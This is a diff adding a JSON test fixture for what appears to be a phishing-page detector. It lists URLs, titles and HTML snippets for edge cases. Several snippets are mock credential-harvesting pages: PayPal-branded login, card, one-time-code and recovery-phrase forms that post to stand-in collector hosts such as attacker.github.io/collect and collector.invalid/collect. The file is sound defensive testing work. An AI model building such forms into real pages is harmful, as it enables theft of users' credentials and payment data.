@@ -1,0 +1,296 @@
+[
+  {
+    "name": "normal login and validation",
+    "url": "https://college.example/login",
+    "title": "College login",
+    "html": "<title>College login</title><form method=post action=/session><input type=email><input type=password><input type=hidden name=csrf><button>Login</button></form><script>document.querySelector('input').addEventListener('input',()=>fetch('/validate'))</script>"
+  },
+  {
+    "name": "pineapple is not Apple",
+    "url": "https://club.example/",
+    "title": "Pineapple Club",
+    "html": "<title>Pineapple Club</title><p>Pineapple Club</p><form method=post><input type=password></form>"
+  },
+  {
+    "name": "query brand is incidental",
+    "url": "https://github.com/login?return_to=paypal&ID=12",
+    "title": "GitHub login",
+    "html": "<title>GitHub login</title><form method=post><input type=email><input type=password></form>"
+  },
+  {
+    "name": "multiple legitimate providers",
+    "url": "https://login.microsoftonline.com/",
+    "title": "Microsoft - sign in using Google",
+    "html": "<title>Microsoft - sign in using Google</title><form method=post><input type=password></form>"
+  },
+  {
+    "name": "provider on third party",
+    "url": "https://app.example/login",
+    "title": "Sign in with Google",
+    "html": "<title>Sign in with Google</title><p>Sign in with Google</p>"
+  },
+  {
+    "name": "private suffix destination and unrelated newsletter",
+    "url": "https://victim.github.io/",
+    "title": "Member login",
+    "html": "<title>Member login</title><form action=https://attacker.github.io/collect method=post><input type=password></form><form action=https://newsletter.example/join><input type=email></form><p>attacker.github.io</p>"
+  },
+  {
+    "name": "base and submitter override",
+    "url": "https://auth.example/account",
+    "title": "Account",
+    "html": "<title>Account</title><base href=https://id.other.example/><form id=auth method=post action=session><input type=password><button formaction=https://elsewhere.test/send>Go</button></form>"
+  },
+  {
+    "name": "empty action ignores base",
+    "url": "https://auth.example/login",
+    "title": "Login",
+    "html": "<title>Login</title><base href=https://other.test/><form method=post><input type=password></form>"
+  },
+  {
+    "name": "void and boolean hidden stack",
+    "url": "https://site.example/",
+    "title": "Home",
+    "html": "<title>Home</title><div hidden><input><span>PayPal</span><input type=password></div><p>Visible</p><iframe src=/help></iframe><iframe hidden src=/hidden></iframe><iframe width=0 src=/zero></iframe><script src=/app.js></script><script src=https://cdn.example/app.js></script>"
+  },
+  {
+    "name": "credential names and textarea",
+    "url": "https://wallet.example/",
+    "title": "Wallet",
+    "html": "<title>Wallet</title><form method=post action=https://external.test/collect><input name=company><input name=creditCardNumber><input type=email><textarea name=recoveryPhrase></textarea><input disabled type=password></form>"
+  },
+  {
+    "name": "meta and inline only script",
+    "url": "http://localhost:8080/",
+    "title": "Local app",
+    "html": "<title>Local app</title><meta http-equiv=Refresh content='0;url=/next'><script>eval('x'); atob('eA==');</script><script src=/app.js>Function('x')</script><iframe style='display: none'></iframe>"
+  },
+  {
+    "name": "private nesting and IPv6",
+    "url": "https://[2001:db8::1]:8443/login2",
+    "title": "Test",
+    "html": "<title>Test</title><form><input autocomplete=username><input autocomplete=current-password></form>"
+  },
+  {
+    "name": "disabled submitter override",
+    "url": "https://auth.example/login",
+    "title": "Login",
+    "html": "<title>Login</title><form method=post><input type=password><fieldset disabled><button formaction=https://external.test/send>Go</button></fieldset></form>"
+  },
+  {
+    "name": "first legend in disabled fieldset",
+    "url": "https://auth.example/login",
+    "title": "Login",
+    "html": "<title>Login</title><form method=post action=https://external.test/send><fieldset disabled><legend><input type=password></legend><input type=email></fieldset></form>"
+  },
+  {
+    "name": "WHATWG numeric IP",
+    "url": "http://2130706433/login",
+    "title": "Login",
+    "html": "<title>Login</title><form method=post><input type=password></form>"
+  },
+  {
+    "name": "WHATWG Unicode path query and IDNA",
+    "url": "https://faß.de/你好?q=café",
+    "title": "Home",
+    "html": "<title>Home</title><p>Home</p>"
+  },
+  {
+    "name": "WHATWG dot segments",
+    "url": "https://site.example/a/%2e%2e/Login2?q='ok'",
+    "title": "Login",
+    "html": "<title>Login</title><form method=post><input type=email></form>"
+  },
+  {
+    "name": "empty delimiters and zero port",
+    "url": "https://site.example:0/?#",
+    "title": "Home",
+    "html": "<title>Home</title><textarea type=hidden name=password>never read a value</textarea>"
+  },
+  {
+    "name": "accessible credential metadata",
+    "url": "https://account.example/",
+    "title": "Member account",
+    "html": "<title>Member account</title><form action=https://elsewhere.test/send method=post><label for=first>Password</label><input id=first><input placeholder='One-time code'><input aria-label='Card number'><span id=seed-label>Recovery phrase</span><textarea aria-labelledby=seed-label></textarea><label>Username<input></label></form>"
+  },
+  {
+    "name": "numbered names and safe label exclusions",
+    "url": "https://account.example/",
+    "title": "Account",
+    "html": "<title>Account</title><form method=dialog><input name=password1><input name=otp6><label>Ordinary field<textarea>password never read this value</textarea></label><input type=search placeholder='Password'><input placeholder='A wallet and a card'><label>Read-only label<span contenteditable=true>Password</span><input></label></form>"
+  },
+  {
+    "name": "hidden field does not hide its visible sibling",
+    "url": "https://account.example/",
+    "title": "Account",
+    "html": "<title>Account</title><form method=post><div><div hidden><input type=password></div><input type=password></div></form>"
+  },
+  {
+    "name": "accessible label text node word boundaries",
+    "url": "https://account.example/",
+    "title": "Account",
+    "html": "<title>Account</title><form method=post><label for=first><span>Password</span><span>required</span></label><input id=first></form>"
+  },
+  {
+    "name": "split label chunks do not invent a password word",
+    "url": "https://account.example/",
+    "title": "Account",
+    "html": "<title>Account</title><form method=post><label for=first><span>Pass</span><span>word</span></label><input id=first></form>"
+  },
+  {
+    "name": "invalid input and button types use browser defaults",
+    "url": "https://account.example/",
+    "title": "Account",
+    "html": "<title>Account</title><form method=post><input type=login aria-label=Password><button type=go formaction=https://other.test/send>Continue</button></form>"
+  },
+  {
+    "name": "inherited editor labels do not expose user input",
+    "url": "https://account.example/",
+    "title": "Account",
+    "html": "<title>Account</title><div contenteditable=true><span id=user-text>Password</span><p>PayPal</p></div><form method=post><input aria-labelledby=user-text></form>"
+  },
+  {
+    "name": "controls never contribute visible brand text",
+    "url": "https://account.example/",
+    "title": "Account",
+    "html": "<title>Account</title><textarea>PayPal</textarea><select><option>Google</option></select><div contenteditable><span>Microsoft</span></div>"
+  },
+  {
+    "name": "non executable script data is neutral",
+    "url": "https://account.example/",
+    "title": "Account",
+    "html": "<title>Account</title><script type=application/ld+json>{\"code\":\"eval(atob(data))\"}</script><script type=text/plain src=https://cdn.other.test/data></script><input type=password>"
+  },
+  {
+    "name": "visible descendant may restore hidden text",
+    "url": "https://account.example/",
+    "title": "Account",
+    "html": "<title>Account</title><div style=visibility:hidden>PayPal<span style=visibility:visible>Google</span></div>"
+  },
+  {
+    "name": "padding invalidates dialog method",
+    "url": "https://account.example/",
+    "title": "Account",
+    "html": "<title>Account</title><form method=' dialog ' action=https://other.test/send><input type=password></form>"
+  },
+  {
+    "name": "ordinary a Google provider phrase",
+    "url": "https://account.example/",
+    "title": "Sign in with a Google Account",
+    "html": "<title>Sign in with a Google Account</title><form method=post action=https://accounts.google.com/login><input type=email autocomplete=username></form>"
+  },
+  {
+    "name": "email password recovery is identity only",
+    "url": "https://account.example/",
+    "title": "Password recovery",
+    "html": "<title>Password recovery</title><form method=get action=https://id.other.test/recover><label>Enter your email to reset your password<input type=email name=email></label></form>"
+  },
+  {
+    "name": "one owned brand cannot suppress another",
+    "url": "https://sites.google.com/view/demo",
+    "title": "PayPal Login",
+    "html": "<title>PayPal Login</title><form method=post action=https://other.test/collect><input type=password></form>"
+  },
+  {
+    "name": "reviewed Google country domain",
+    "url": "https://www.google.ch/",
+    "title": "Google Account",
+    "html": "<title>Google Account</title><form method=post action=https://accounts.google.com/session><input type=password></form>"
+  },
+  {
+    "name": "closed details and dialog controls are inactive",
+    "url": "https://account.example/",
+    "title": "Account",
+    "html": "<title>Account</title><details><summary>Archived</summary><form method=post action=https://other.test/><input type=password></form><h1>PayPal</h1></details><dialog><input type=password></dialog>"
+  },
+  {
+    "name": "first summary control stays rendered",
+    "url": "https://account.example/",
+    "title": "Account",
+    "html": "<title>Account</title><details><summary><input type=password></summary><input type=password></details>"
+  },
+  {
+    "name": "content visibility hidden controls",
+    "url": "https://account.example/",
+    "title": "Account",
+    "html": "<title>Account</title><div style='content-visibility:hidden'><input type=password></div>"
+  },
+  {
+    "name": "hidden submitter override is inactive",
+    "url": "https://account.example/",
+    "title": "Account",
+    "html": "<title>Account</title><form method=post action=/session><input type=password><button>Sign in</button><button hidden formaction=https://other.test/send>Legacy</button></form>"
+  },
+  {
+    "name": "primary body identity supplements title",
+    "url": "https://account.example/",
+    "title": "Sign in",
+    "html": "<title>Sign in</title><h1>PayPal</h1><form method=post><input type=password></form>"
+  },
+  {
+    "name": "incidental body heading is not identity",
+    "url": "https://account.example/",
+    "title": "Sign in",
+    "html": "<title>Sign in</title><h1>PayPal account recovery guide</h1><form method=post><input type=password></form>"
+  },
+  {
+    "name": "custom editable textbox metadata only",
+    "url": "https://account.example/",
+    "title": "Sign in",
+    "html": "<title>Sign in</title><div role=textbox contenteditable=true aria-label=Password>private contents never read</div><div role=textbox contenteditable=false aria-label=Password>static text</div>"
+  },
+  {
+    "name": "generic card field labels",
+    "url": "https://account.example/",
+    "title": "Checkout",
+    "html": "<title>Checkout</title><form method=post><label>Credit card<input name=x></label><label>Expiration<input name=y></label><label>Security code<input name=z></label></form>"
+  },
+  {
+    "name": "email control wins over recovery metadata name",
+    "url": "https://account.example/",
+    "title": "Account",
+    "html": "<title>Account</title><form method=get action=https://id.other.test/recover><input type=email name=passwordResetEmail placeholder='Password reset email'></form>"
+  },
+  {
+    "name": "hidden heading descendants are not a claim",
+    "url": "https://account.example/",
+    "title": "Sign in",
+    "html": "<title>Sign in</title><h1><span hidden>PayPal</span></h1><form method=post><input type=password></form>"
+  },
+  {
+    "name": "article identity cannot attach to separate login",
+    "url": "https://account.example/",
+    "title": "Sign in",
+    "html": "<title>Sign in</title><article><h1>PayPal</h1></article><form method=post><input type=password></form>"
+  },
+  {
+    "name": "footer login cannot attach to unrelated heading",
+    "url": "https://account.example/",
+    "title": "Sign in",
+    "html": "<title>Sign in</title><h1>PayPal</h1><p>Article content</p><footer><form method=post><input type=password></form></footer>"
+  },
+  {
+    "name": "body identity scoped across separate forms",
+    "url": "https://account.example/",
+    "title": "Sign in",
+    "html": "<title>Sign in</title><h1>PayPal</h1><form method=post><input type=password></form><section><h2>Separate login</h2><form method=post action=https://other.test/session><input type=password></form></section>"
+  },
+  {
+    "name": "email verification code",
+    "url": "https://members.example/verify",
+    "title": "PayPal sign in",
+    "html": "<title>PayPal sign in</title><form method=\"post\" action=\"https://collector.invalid/collect\"><label>Email verification code<input type=\"text\"></label></form>"
+  },
+  {
+    "name": "authenticator code",
+    "url": "https://members.example/verify",
+    "title": "PayPal sign in",
+    "html": "<title>PayPal sign in</title><form method=\"post\" action=\"https://collector.invalid/collect\"><label>Authenticator code<input type=\"text\"></label></form>"
+  },
+  {
+    "name": "recovery email remains identity",
+    "url": "https://members.example/verify",
+    "title": "PayPal sign in",
+    "html": "<title>PayPal sign in</title><form method=\"post\" action=\"https://collector.invalid/collect\"><label>Email address to reset your password<input type=\"text\"></label></form>"
+  }
+]
